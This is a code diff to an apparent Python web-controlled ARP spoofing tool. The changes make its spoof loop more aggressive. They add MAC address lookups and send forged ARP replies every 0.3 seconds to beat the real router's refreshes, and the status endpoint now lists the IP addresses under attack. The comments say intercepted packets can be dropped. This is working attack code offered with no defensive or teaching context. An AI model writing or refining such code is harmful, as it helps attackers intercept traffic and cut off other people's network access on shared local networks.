@@ -154,13 +154,17 @@ def spoof_loop(target_ip, gateway_ip):
     # but doing both is common. The target sending packets to us is enough if we drop them.
     
     while active_attacks.get(target_ip):
+        if not target_mac: target_mac = get_mac(target_ip)
+        if not gateway_mac: gateway_mac = get_mac(gateway_ip)
+        
         if target_mac and gateway_mac:
             # Tell target we are the gateway
             spoof(target_ip, gateway_ip, target_mac)
             # Tell gateway we are the target
             spoof(gateway_ip, target_ip, gateway_mac)
-        # Send packets faster to combat the real router's ARP broadcasts
-        time.sleep(1)
+        
+        # Aggressive sleep: 0.3s to beat original router's ARP refreshes
+        time.sleep(0.3)
 
 @app.route('/status')
 def status():
@@ -177,7 +181,8 @@ def status():
     return jsonify({
         "host_ip": host_ip,
         "gateway_ip": gateway_ip,
-        "interface": iface
+        "interface": iface,
+        "attacked_ips": [ip for ip, active in active_attacks.items() if active]
     })
 
 @app.route('/')
